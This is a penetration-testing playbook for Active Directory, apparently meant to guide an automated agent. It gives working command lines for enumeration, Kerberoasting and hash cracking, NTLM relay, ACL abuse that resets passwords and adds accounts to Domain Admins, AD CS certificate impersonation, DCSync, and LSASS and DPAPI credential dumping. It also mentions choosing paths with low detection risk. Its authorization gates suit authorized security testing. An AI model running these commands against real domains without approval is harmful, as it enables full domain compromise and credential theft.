# Active Directory Playbook

Use when Kerberos, LDAP, SMB, domain controllers, Windows domain names, or AD credentials are in scope.

## Inputs

- Domain name, domain controller IPs, DNS server, known users, credentials or hashes if provided.
- Authorized techniques: enumeration only, password audit, relay, AD CS testing, exploitation.
- Lockout policy and allowed authentication rate.

## Workflow

1. **Identify AD signals**
   - Look for ports 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, and 5986.
   - Confirm domain, DCs, DNS, SMB signing, LDAP/LDAPS, and time skew.

   (See `../information-gathering/README.md` for scanning tool selection.)

   ```bash
   # AD port scan on candidate DC
   nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,5986 -sV -sC <dc-ip> -oA ad_portscan
   # SMB signing check across subnet (unsigned = relay target)
   nxc smb <subnet>/24 --gen-relay-list relay_targets.txt
   # Time skew check (Kerberos requires sync within 5 min)
   nmap -p 445 --script smb2-time <dc-ip>
   ```

   **Zero-findings fallback:** If no domain controller is found, verify DNS resolution (`dig SRV _ldap._tcp.dc._msdcs.<domain>`), scan broader subnets for AD ports (88, 389, 445), and check whether the host is on a segmented VLAN without DC visibility. Do not proceed to Phase 2 without at least one confirmed DC.

2. **Unauthenticated enumeration**
   - Use `nmap`, `smbclient` (see `../exploitation/tools/smbclient.md`), `smbmap` (see `../vulnerability/tools/smbmap.md`), `enum4linux-ng` (see `../vulnerability/tools/enum4linux-ng.md`), `netexec` (see `../password/tools/netexec.md`), and LDAP/Kerberos checks where allowed.
   - Check null sessions, anonymous LDAP, shares, naming contexts, and exposed users.
   - Be aware of LLMNR/NBT-NS/mDNS poisoning opportunities on the network segment. If name resolution poisoning is in scope, see `responder` usage in the [password audit playbook](password-audit.md).

   (See `../vulnerability/README.md` for enumeration tool selection.)

   Run `kerbrute userenum` with a username wordlist (see `../password/tools/kerbrute.md`; flag AS-REP roastable accounts automatically).

   ```bash
   # Comprehensive unauthenticated enumeration
   enum4linux-ng -A <dc-ip> -oJ /tmp/enum4linux
   # Null-session share enumeration
   smbmap -H <dc-ip> -u '' -p ''
   # List available shares anonymously
   smbclient -L //<dc-ip>/ -N
   ```

3. **Authenticated enumeration**
   - Use `netexec`, `impacket`, `bloodhound-python` or `bloodhound-ce-python`, `certipy-ad find`, and share enumeration.
   - Collect users, groups, sessions, local admins, ACLs, SPNs, delegation, trusts, and AD CS data.

   (See `../post-exploitation/README.md` for post-exploitation tool selection.)

   Run authenticated collection tools:
   - `bloodhound-python -c All` for AD attack path data (see `../post-exploitation/tools/bloodhound.md`)
   - `certipy-ad find` for AD CS enumeration (see `../post-exploitation/tools/certipy-ad.md`; covers ESC1-ESC16)
   - `impacket-GetUserSPNs -request` for Kerberoastable accounts (see `../exploitation/tools/impacket.md`)

   ```bash
   # Authenticated SMB/LDAP enumeration with netexec
   nxc smb <dc-ip> -u <user> -p '<password>' --shares --users --groups
   nxc ldap <dc-ip> -u <user> -p '<password>' --users
   # LDAP-native delegation and trust enumeration
   ldeep ldap -d <domain> -u <user> -p '<password>' -s ldap://<dc-ip> delegations
   ldeep ldap -d <domain> -u <user> -p '<password>' -s ldap://<dc-ip> trusts
   ```

   Use `ldeep` for deep LDAP enumeration of delegations, trusts, and GPO data (see `../information-gathering/tools/ldeep.md`).

   **Enumeration completeness verification:** Cross-check user counts between LDAP queries, `bloodhound-python` output, and `nxc` results. If counts differ, investigate before proceeding. Verify that SPN enumeration, delegation configuration queries, ACL collection, and AD CS template enumeration all completed without errors or truncation.

4. **Attack path analysis**
   - Use BloodHound/Neo4j analysis only when an existing UI, API, or operator-supported workflow is available.
   - Treat `bloodhound-python` collection output as the agent artifact; do not launch the BloodHound GUI from automated CLI playbooks.
   - Prioritize high-impact queries: shortest paths to Domain Admins, AS-REP roastable users, Kerberoastable users, local admin paths, and AD CS escalation paths.
   - Validate high-impact paths manually before reporting.

   Extract key attack path indicators from `bloodhound-python` JSON output with `jq`:

   ```bash
   # Extract Domain Admins group members
   jq -r '.data[] | select(.Properties.admincount==true) | .Properties.name' *_users.json
   # Find Kerberoastable users (hasspn=true)
   jq -r '.data[] | select(.Properties.hasspn==true) | .Properties.name' *_users.json
   # Find AS-REP roastable users (dontreqpreauth=true)
   jq -r '.data[] | select(.Properties.dontreqpreauth==true) | .Properties.name' *_users.json
   ```

   For full graph-based attack path analysis, import the collected data into BloodHound CE and use its REST API or web interface.

5. **Credential and Kerberos testing**
   - Switch to the password audit playbook for AS-REP roasting, Kerberoasting, spraying, cracking, or hash reuse.
   - Respect lockout policy and require approval for spraying or brute force.

   (See `../password/README.md` for credential and cracking tool selection.)

   Extract crackable hashes:
   - AS-REP roasting: `impacket-GetNPUsers` (see `../exploitation/tools/impacket.md`)
   - Kerberoasting: `impacket-GetUserSPNs -request` (see `../exploitation/tools/impacket.md`)
   - Password spray: `kerbrute passwordspray` (see `../password/tools/kerbrute.md`)

   Crack obtained hashes with `hashcat` (see `../password/tools/hashcat.md`):

   ```bash
   # AS-REP roast hash cracking (mode 18200)
   hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
   # Kerberoast hash cracking (mode 13100)
   hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
   ```

   **Exhaustive credential testing:** Crack ALL extracted hashes (AS-REP and Kerberoast), not just the first few — use `rockyou.txt` with rules, then escalate to mask and hybrid attacks for uncracked hashes. Test every cracked credential for reuse across all authorized services (SMB, WinRM, RDP, MSSQL, LDAP, SSH). After any new credential is obtained, return to Phase 3 and re-enumerate with the new privilege level — each credential unlocks different shares, ACLs, and group memberships.

6. **Coercion, relay, and exploitation**
   - Use `responder`, `coercer`, `mitm6`, `ntlmrelayx`, AD CS abuse, or exploitation only with explicit approval.

   (See `../exploitation/README.md` for exploitation tool selection.)
   - Use `responder` for LLMNR/NBT-NS/mDNS poisoning to capture Net-NTLMv2 hashes on the local segment (see `../password/tools/responder.md`).
   - Record exact prerequisites and impact.

   NTLM relay attack chain: set up `impacket-ntlmrelayx` listener, then coerce target authentication with `coercer` (see `../exploitation/tools/impacket.md` and `../exploitation/tools/coercer.md`).

7. **ACL and delegation abuse**
   - When BloodHound shows exploitable ACL paths, test with `bloodyad` (see `../post-exploitation/tools/bloodyad.md`):

   (See `../post-exploitation/README.md` for post-exploitation tool selection.)
     - WriteDACL: grant yourself privileges on the target object.
     - GenericAll / GenericWrite: modify target attributes (e.g., set SPN for targeted Kerberoasting, reset password).
     - ForceChangePassword: reset a user password without knowing the current one.
     - AddMember: add a controlled account to a privileged group.
   - Decision point: choose the abuse path that reaches Domain Admin with the fewest steps and lowest detection risk, based on BloodHound shortest-path results.

   ```bash
   # Reset target user password via WriteDACL / ForceChangePassword
   bloodyad -d <domain> -u <user> -p '<pass>' --host <dc-ip> set password <target> 'NewPass1!'
   # Add controlled user to Domain Admins via AddMember
   bloodyad -d <domain> -u <user> -p '<pass>' --host <dc-ip> add groupMember "Domain Admins" <user>
   ```

   - Test delegation abuse:
     - Unconstrained delegation: monitor for incoming TGTs with `krbrelayx`.
     - Constrained delegation: perform S4U2Self/S4U2Proxy attacks to impersonate privileged users to target services.
     - Resource-Based Constrained Delegation (RBCD): configure `msDS-AllowedToActOnBehalfOfOtherIdentity` with `bloodyad`, then use S4U2Proxy to obtain service tickets.

8. **AD CS exploitation**
   - Expand beyond enumeration. After `certipy-ad find` identifies vulnerable templates (Phase 3):
     - ESC1 (misconfigured enrollment): request a certificate impersonating a privileged user.

       ```bash
       certipy-ad req -u user@domain -p 'password' -ca 'CA-NAME' -template 'VulnTemplate' -upn administrator@domain -dc-ip <dc-ip>
       ```

     - Authenticate with the obtained PFX to retrieve the NT hash.

       ```bash
       certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>
       ```

     - ESC8 (HTTP enrollment endpoint): relay NTLM authentication to the AD CS HTTP enrollment service.

       ```bash
       impacket-ntlmrelayx -t http://<ca-host>/certsrv/certfnsh.asp -smb2support --adcs --template 'Machine'
       ```

   - Decision: if ESC1-ESC4 vulnerable templates are found, pursue certificate request and authentication. If HTTP enrollment is enabled (ESC8), set up NTLM relay to AD CS.

   **Attack path fallback chains:** Do not stop a branch when the first technique fails. If coercion fails, try alternative methods (PrinterBug, PetitPotam, DFSCoerce). If no ESC1-ESC4 templates are vulnerable, check ESC5-ESC11. If no ACL paths reach Domain Admin, investigate GPO abuse, LAPS, GMSA, or delegation chains. Document each attempted and failed path.

9. **GPO and trust abuse**
   - GPO password extraction: search SYSVOL for `cpassword` values in `Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, and `DataSources.xml`.

   (See `../post-exploitation/README.md` for post-exploitation tool selection.)

     ```bash
     impacket-Get-GPPPassword domain/user:password@<dc-ip>
     # Decrypt cpassword values found in SYSVOL XML files
     gpp-decrypt <cpassword-value>
     ```

   Use `impacket-Get-GPPPassword` to extract GPP passwords from SYSVOL (see `../exploitation/tools/impacket.md`). Use `gpp-decrypt` to decrypt individual `cpassword` values extracted from Group Policy Preference XML files (see `../password/tools/gpp-decrypt.md`).

   - If write access to a GPO is available, document the abuse path (scheduled task or script deployment) but require explicit approval before modifying GPO objects.
   - LAPS password reading: query LDAP for `ms-Mcs-AdmPwd` (LAPS v1) or `msLAPS-Password` (LAPS v2) attributes on computer objects. Use `lapsdumper` for streamlined LAPS password extraction (see `../post-exploitation/tools/lapsdumper.md`):

     ```bash
     # Dump LAPS passwords from AD
     lapsdumper -d <domain> -u <user> -p '<password>' -l <dc-ip>
     ```
   - GMSA password retrieval: read `msDS-ManagedPassword` attribute for Group Managed Service Accounts when the reading principal is authorized.
   - Cross-domain and forest trust enumeration: map trust direction, transitivity, and SID filtering. Note SID History injection considerations for cross-domain privilege escalation (requires explicit authorization).

10. **Credential materialization**
    - After obtaining domain admin or equivalent privileges (requires explicit authorization for each action):

    (See `../post-exploitation/README.md` for credential extraction tool selection.)
      - DCSync: extract domain credential database with `impacket-secretsdump` (see `../exploitation/tools/impacket.md`).

        ```bash
        impacket-secretsdump domain/admin:password@<dc-ip> -just-dc
        ```

      - Golden Ticket creation: document feasibility with obtained `krbtgt` hash. Note: creates persistent domain-level access; requires explicit authorization and scope confirmation.
      - Shadow credentials: write to `msDS-KeyCredentialLink` attribute to enable certificate-based authentication as the target principal.
      - DPAPI secrets extraction: use `dploot` to retrieve domain backup keys and decrypt DPAPI-protected secrets (see `../post-exploitation/tools/dploot.md`).

        ```bash
        dploot backupkey -d <domain> -u administrator -p '<password>' -t <dc-ip>
        ```

      - Bulk DPAPI credential extraction: use `hekatomb` to extract DPAPI-protected credentials across all domain computers (see `../post-exploitation/tools/hekatomb.md`):

        ```bash
        # Bulk DPAPI credential extraction across all domain computers
        hekatomb <domain>/<user>:'<password>'@<dc-ip>
        ```

      - LSASS credential extraction: use `lsassy` for remote LSASS dump and credential parsing (see `../post-exploitation/tools/lsassy.md`).

        ```bash
        lsassy -d <domain> -u administrator -p '<password>' <target-ip>
        ```
    - All credential materialization actions must have explicit authorization documented before execution.
    - After domain compromise, continue with the [post-exploitation playbook](post-exploitation.md) for lateral movement and persistence documentation.
    - For cracking obtained hashes, refer to the [password audit playbook](password-audit.md).

## Cross-References

- `password-audit.md` — spraying, cracking, hash reuse workflows.
- `post-exploitation.md` — lateral movement, persistence, and privilege escalation after domain compromise.
- `internal-network.md` — network-level enumeration and pivoting within the internal environment.
- `cloud-native-assessment.md` — when Azure AD / Entra ID hybrid configuration, Azure AD Connect, or cloud-synced accounts are discovered.
- `reporting-workflow.md` — structuring findings and evidence into deliverable reports.

## Expected Artifacts

- Domain, DC, DNS, and trust summary.
- User/group/computer/share inventory.
- BloodHound collection files and high-risk paths.
- AD CS findings and certificate template risks.
- ACL abuse paths and delegation configurations.
- GPO, LAPS, and GMSA findings.
- Credential testing evidence and lockout-safe notes.
- DCSync output and materialized credential inventory (if authorized).

## Stop When

- BloodHound collection, share enumeration, ACL collection, and AD CS enumeration have all completed without errors or truncation for every authorized domain.
- All extracted hashes (AS-REP, Kerberoast, DCSync) have been cracked or exhausted against the agreed attack escalation ladder.
- Every cracked credential has been tested for reuse across all authorized services and the credential × service matrix is fully populated.
- Further progress requires spraying, relay, exploitation, or target-side code execution beyond current authorization.
- New domains or trusts require scope expansion.
